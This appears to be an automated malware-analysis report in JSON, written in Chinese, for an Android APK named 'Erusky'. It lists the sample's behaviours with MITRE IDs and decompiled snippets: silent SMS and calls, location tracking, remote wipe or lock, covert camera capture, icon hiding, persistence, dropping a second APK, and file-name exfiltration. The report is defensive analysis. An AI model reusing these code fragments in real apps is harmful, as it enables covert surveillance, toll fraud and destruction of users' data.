@@ -1,0 +1,322 @@
+{
+  "APK信息": {
+    "文件名": "1e181c65751d1c744d60f54871b93f186f1e1757c3970024340b33303b9e4ffe.apk",
+    "sha256": "1e181c65751d1c744d60f54871b93f186f1e1757c3970024340b33303b9e4ffe",
+    "包名": "yps.eton.application",
+    "应用名": "Erusky",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 336.0
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lyps\\eton\\application\\A;",
+          "method_signature": "switch(getResultCode()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager.getDefault().sendTextMessage(str, null, str2, broadcast, broadcast2);",
+          "malicious_code_snippet_context": "                              }\n                          }\n                      }, new IntentFilter(\"SMS_SENT\"));\n>>>                     SmsManager.getDefault().sendTextMessage(str, null, str2, broadcast, broadcast2);\n                  } catch (Exception e2) {\n                      A.this.h(\"phonefxf0x4x4x0fxf[My/Exception][SMS]:\" + e2.getMessage().toString());\n                  }",
+          "behavior_description": "代码在后台线程中通过SmsManager静默发送短信，并注册广播监听短信发送状态，可能导致用户在不知情的情况下被扣除话费或订阅扣费服务。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "location_tracking",
+      "中文名": "位置追踪",
+      "MITRE": "T1430",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.ACCESS_FINE_LOCATION",
+          "android.permission.ACCESS_COARSE_LOCATION"
+        ],
+        "字符串": [
+          "requestLocationUpdates"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lyps\\eton\\application\\G;",
+          "method_signature": "if(!isProviderEnabled2 && !isProviderEnabled)",
+          "malicious_behavior": "location_tracking",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "boolean isProviderEnabled = this.e.isProviderEnabled(\"network\"); boolean isProviderEnabled2 = this.e.isProviderEnabled(\"gps\"); if (isProviderEnabled) { this.c = \"network\"; this.e.requestLocationUpdates(\"network\", 5000L, (float) 10, this.d); } else if (isProviderEnabled2) { this.c = \"gps\"; this.e.requestLocationUpdates(\"gps\", 5000L, (float) 10, this.d); }",
+          "malicious_code_snippet_context": "                  }\n              };\n              if (a.a(getApplicationContext(), \"android.permission.ACCESS_FINE_LOCATION\") == 0 || a.a(getApplicationContext(), \"android.permission.ACCESS_COARSE_LOCATION\") == 0) {\n>>>                 boolean isProviderEnabled = this.e.isProviderEnabled(\"network\");\n                  boolean isProviderEnabled2 = this.e.isProviderEnabled(\"gps\");\n                  if (!isProviderEnabled2 && !isProviderEnabled) {\n                      this.c = null;",
+          "behavior_description": "代码通过LocationManager检查GPS和网络定位提供者是否可用，然后以5秒间隔、10米最小距离为阈值，持续请求位置更新（requestLocationUpdates），位置数据通过LocationListener回调(this.d)持续收集。在恶意样本背景下，该位置数据可能被窃取或上传至C2服务器，构成对用户物理位置的持续追踪。数据流向：LocationManager(GPS/Network Provider) → requestLocationUpdates() → LocationListener(this.d)回调持续接收位置坐标",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lyps\\eton\\application\\A;",
+          "method_signature": "switch(Integer.parseInt(str)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.l = (DevicePolicyManager) getSystemService(\"device_policy\");\nswitch (Integer.parseInt(str)) {\n    case 0:\n        this.l.wipeData(0);\n        break;\n    case 1:\n        this.l.lockNow();\n        break;\n}",
+          "malicious_code_snippet_context": "          try {\n              this.k = new i(this);\n              if (this.k.a()) {\n>>>                 this.l = (DevicePolicyManager) getSystemService(\"device_policy\");\n>>>                 switch (Integer.parseInt(str)) {\n>>>                     case 0:\n>>>                         this.l.wipeData(0);\n>>>                         break;\n>>>                     case 1:\n>>>                         this.l.lockNow();\n>>>                         break;\n>>>                 }\n              }\n          } catch (Exception e2) {\n          }",
+          "behavior_description": "代码通过 getSystemService 获取 DevicePolicyManager 实例，根据外部传入的字符串参数 str 解析为整数进行分支判断：当值为0时调用 wipeData(0) 擦除设备数据，当值为1时调用 lockNow() 立即锁定设备屏幕。这是典型的勒索软件设备锁定行为，攻击者通过远程指令参数控制设备锁定或数据擦除，使用户无法正常使用设备，以此进行勒索。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lyps\\eton\\application\\A;",
+          "method_signature": "if(getResources()",
+          "malicious_behavior": "persistence",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (getResources().getString(R.string.group_properties).charAt(5) == '1') {\n    String string = getResources().getString(R.string.app_name);\n    startForeground(2006, new c.b(this).a(R.drawable.transparent).a(string).b(getResources().getString(R.string.service_name)).a(PendingIntent.getActivity(this, 0, new Intent(this, (Class<?>) A.class), 0)).a());\n}",
+          "malicious_code_snippet_context": "      @Override // android.app.Service\n      public void onCreate() {\n          super.onCreate();\n>>>         if (getResources().getString(R.string.group_properties).charAt(5) == '1') {\n>>>             String string = getResources().getString(R.string.app_name);\n>>>             startForeground(2006, new c.b(this).a(R.drawable.transparent).a(string).b(getResources().getString(R.string.service_name)).a(PendingIntent.getActivity(this, 0, new Intent(this, (Class<?>) A.class), 0)).a());\n>>>         }\n          try {\n              a();\n          } catch (Exception e2) {",
+          "behavior_description": "在 Service.onCreate 中通过读取资源字符串 group_properties 的第5个字符作为开关标志，当为 '1' 时调用 startForeground 将服务提升为前台服务，使用透明图标(R.drawable.transparent)构造通知以降低用户感知，实现服务保活防杀。数据来源为 getResources().getString() 读取资源配置，危险操作为 startForeground() 提升服务优先级实现持久化保活。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.INSTALL_PACKAGES"
+            ],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        },
+        {
+          "子行为": "silent_uninstall",
+          "中文名": "静默卸载",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.DELETE"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lyps\\eton\\application\\M;",
+          "method_signature": "if(read == -1)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "FileOutputStream fileOutputStream = new FileOutputStream(new File(str2));\nint read = openRawResource.read(bArr, 0, bArr.length);\nif (read == -1) {\n    openRawResource.close();\n    fileOutputStream.close();\n    Intent intent = new Intent(\"android.intent.action.VIEW\");\n    intent.setFlags(268468224);\n    intent.setDataAndType(Uri.parse(\"file://\" + str2), \"application/vnd.android.package-archive\");\n    M.this.startActivity(intent);\n}",
+          "malicious_code_snippet_context": "                      if (openRawResource.available() == 0) {\n                          return;\n                      }\n>>>                     FileOutputStream fileOutputStream = new FileOutputStream(new File(str2));\n>>>                     byte[] bArr = new byte[1024];\n>>>                     while (true) {\n>>>                         try {\n>>>                             int read = openRawResource.read(bArr, 0, bArr.length);\n>>>                             if (read == -1) {\n>>>                                 openRawResource.close();\n>>>                                 fileOutputStream.close();\n>>>                                 Intent intent = new Intent(\"android.intent.action.VIEW\");\n>>>                                 intent.setFlags(268468224);\n                                  intent.setDataAndType(Uri.parse(\"file://\" + str2), \"application/vnd.android.package-archive\");\n                                  M.this.startActivity(intent);\n                                  return;",
+          "behavior_description": "代码从APK内嵌的raw资源中读取数据（疑似另一个恶意APK），写入本地文件路径str2，随后构造ACTION_VIEW Intent并设置MIME类型为application/vnd.android.package-archive，通过startActivity调起系统包安装器诱导用户安装该APK。数据流向：openRawResource（内嵌恶意APK资源）→ FileOutputStream写入本地文件 → startActivity触发APK安装流程。虽然使用了ACTION_VIEW会弹出系统安装界面（非完全静默），但在已确认的恶意样本上下文中，此行为属于释放并诱导安装二次载荷的恶意行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lyps\\eton\\application\\e;",
+          "method_signature": "onPreviewFrame(byte[] bArr, Camera camera)",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public void onPictureTaken(byte[] bArr, Camera camera) { a(bArr); d(); }\npublic void onPreviewFrame(byte[] bArr, Camera camera) { camera.setPreviewCallback(null); camera.takePicture(null, null, this); }",
+          "malicious_code_snippet_context": "      }\n  \n      @Override // android.hardware.Camera.PictureCallback\n>>>     public void onPictureTaken(byte[] bArr, Camera camera) {\n>>>         a(bArr);\n          d();\n      }\n  ",
+          "behavior_description": "在摄像头预览帧回调 onPreviewFrame 中，立即取消预览回调并调用 camera.takePicture 静默拍照，随后在 onPictureTaken 中将拍摄到的图片字节数据传入 a(bArr) 进行处理（可能用于存储或上传），整个过程无任何用户交互或预览界面，属于隐蔽拍照窃取用户影像隐私的恶意行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lyps\\eton\\application\\A;",
+          "method_signature": "p(String str)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.CALL\");\nintent.setData(Uri.parse(\"tel:\" + str));\nintent.setFlags(268435456);\nstartActivity(intent);",
+          "malicious_code_snippet_context": "      /* JADX INFO: Access modifiers changed from: private */\n      public void p(String str) {\n          try {\n>>>             Intent intent = new Intent(\"android.intent.action.CALL\");\n>>>             intent.setData(Uri.parse(\"tel:\" + str));\n>>>             intent.setFlags(268435456);\n>>>             if (a.a(getApplicationContext(), \"android.permission.CALL_PHONE\") != 0) {\n                  h(\"phonefxf0x4x4x0fxfphone_callc0c1c3a2c0c1c[Call]:permission.CALL_PHONE\");\n              } else {\n                  h(\"phonefxf0x4x4x0fxfphone_callc0c1c3a2c0c1c[Call]:startActivity\");",
+          "behavior_description": "代码接收传入的电话号码字符串，构造ACTION_CALL意图并直接调用startActivity发起电话呼叫，无需用户交互，可能导致高额扣费或骚扰电话。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "file_access",
+      "中文名": "文件访问/窃取",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_EXTERNAL_STORAGE",
+          "android.permission.WRITE_EXTERNAL_STORAGE"
+        ],
+        "字符串": [
+          "listFiles",
+          "getExternalStorageDirectory"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lyps\\eton\\application\\A;",
+          "method_signature": "if(!h)",
+          "malicious_behavior": "file_access",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "File[] listFiles = new File(getApplicationContext().getFilesDir().getPath()).listFiles();\nif (listFiles != null && listFiles.length > 0) {\n    for (File file : listFiles) {\n        sb.append(file.getName() + \"e1x1114x61114e\");\n    }\n}\nh(\"key_loggerfxf0x4x4x0fxfstartc0c1c3a2c0c1c\" + sb.toString());",
+          "malicious_code_snippet_context": "          }\n          StringBuilder sb = new StringBuilder();\n          try {\n>>>             File[] listFiles = new File(getApplicationContext().getFilesDir().getPath()).listFiles();\n>>>             if (listFiles != null && listFiles.length > 0) {\n>>>                 for (File file : listFiles) {\n>>>                     sb.append(file.getName() + \"e1x1114x61114e\");\n>>>                 }\n>>>             }\n>>>         } catch (Exception e2) {\n              Log.e(\"Exception\", \"failed: \" + e2.toString());\n          }\n          h(\"key_loggerfxf0x4x4x0fxfstartc0c1c3a2c0c1c\" + sb.toString());",
+          "behavior_description": "代码遍历应用私有目录下的所有文件，提取文件名并拼接成字符串，随后通过h()方法将带有\"key_logger\"标识的文件名列表外传，属于窃取本地文件信息的行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lyps\\eton\\application\\M;",
+          "method_signature": "if(string.charAt(0)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (string.charAt(0) == '1') { getPackageManager().setComponentEnabledSetting(new ComponentName(this, (Class<?>) M.class), 2, 1); }",
+          "malicious_code_snippet_context": "if (string.charAt(0) == '1') { getPackageManager().setComponentEnabledSetting(new ComponentName(this, (Class<?>) M.class), 2, 1); }",
+          "behavior_description": "代码从资源文件读取配置字符串 group_properties，检查首字符是否为 '1'，若满足条件则调用 setComponentEnabledSetting 将自身 Activity 组件设置为禁用状态（参数2=COMPONENT_ENABLED_STATE_DISABLED），使应用图标从启动器中隐藏。这是恶意软件常用的图标隐藏技术，让用户难以发现和卸载应用，为后续隐蔽执行恶意行为创造条件。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
